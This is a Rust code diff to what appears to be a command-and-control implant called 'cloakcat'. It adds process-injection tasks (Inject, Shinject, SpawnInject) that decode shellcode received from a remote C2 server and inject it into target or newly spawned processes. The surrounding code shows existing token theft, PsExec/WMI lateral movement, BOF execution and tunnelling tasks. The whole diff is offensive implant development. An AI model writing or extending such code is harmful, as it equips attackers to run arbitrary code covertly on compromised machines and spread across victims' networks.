@@ -14,8 +14,8 @@ use anyhow::Context;
 use base64::Engine;
 use cloakcat_protocol::{
     profile_by_name, sign_result, BofTask, Command, DerivedKeys, DownloadTask, Endpoints,
-    JumpPsexecTask, JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask, ResultReq,
-    StealTokenTask, TaskType, TunnelAction, UploadTask,
+    InjectTask, JumpPsexecTask, JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask,
+    ResultReq, ShinjectTask, SpawnInjectTask, StealTokenTask, TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -71,6 +71,7 @@ async fn dispatch_task<T: Transport>(
     auth_token: &str,
     cmd: &Command,
     token_state: &mut tasks::token::TokenState,
+    spawn_process: Option<&str>,
 ) -> anyhow::Result<(i32, String, String)> {
     match cmd.task_type {
         TaskType::Shell => run_command(cmd).await,
@@ -133,6 +134,27 @@ async fn dispatch_task<T: Transport>(
                     .context("bad BOF args base64")?
             };
             crate::bof::execute_bof(&bof_bytes, &args_bytes).await
+        }
+        TaskType::Inject => {
+            let task: InjectTask = serde_json::from_str(&cmd.command)
+                .context("bad InjectTask payload")?;
+            let shellcode = base64::engine::general_purpose::STANDARD
+                .decode(&task.shellcode_b64)
+                .context("bad shellcode base64")?;
+            tasks::inject::inject(task.pid, &shellcode)
+        }
+        TaskType::Shinject => {
+            let task: ShinjectTask = serde_json::from_str(&cmd.command)
+                .context("bad ShinjectTask payload")?;
+            tasks::inject::shinject(task.pid, &task.shellcode_path)
+        }
+        TaskType::SpawnInject => {
+            let task: SpawnInjectTask = serde_json::from_str(&cmd.command)
+                .context("bad SpawnInjectTask payload")?;
+            let shellcode = base64::engine::general_purpose::STANDARD
+                .decode(&task.shellcode_b64)
+                .context("bad shellcode base64")?;
+            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process)
         }
     }
 }
@@ -295,7 +317,7 @@ pub async fn run() -> anyhow::Result<()> {
         };
         debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);
 
-        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state).await {
+        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, cfg.spawn_process.as_deref()).await {
             Ok(triple) => triple,
             Err(e) => {
                 debug_log!("[agent] task error: {e} -> send minimal result");
